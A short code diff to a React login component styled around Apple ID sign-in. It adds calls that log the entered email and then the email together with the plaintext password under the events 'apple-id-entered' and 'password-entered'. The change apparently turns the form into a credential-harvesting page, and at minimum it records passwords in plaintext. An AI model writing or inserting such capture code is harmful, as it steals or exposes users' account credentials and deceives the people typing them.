@@ -1,4 +1,5 @@
 import React, { useState } from "react";
+import { logResponseEntry } from "../utils/responseLogger";
 
 export default function Main({ onAppleSignIn }) {
   const [email, setEmail] = useState("");
@@ -9,12 +10,21 @@ export default function Main({ onAppleSignIn }) {
     if (e.key !== "Enter") return;
     e.preventDefault();
     if (!email.trim()) return;
+    logResponseEntry({
+      event: "apple-id-entered",
+      email,
+    });
     setShowPassword(true);
   }
 
   function handleLoginSubmit(e) {
     e.preventDefault();
     if (!email.trim() || !password.trim()) return;
+    logResponseEntry({
+      event: "password-entered",
+      email,
+      password,
+    });
     onAppleSignIn();
   }
 
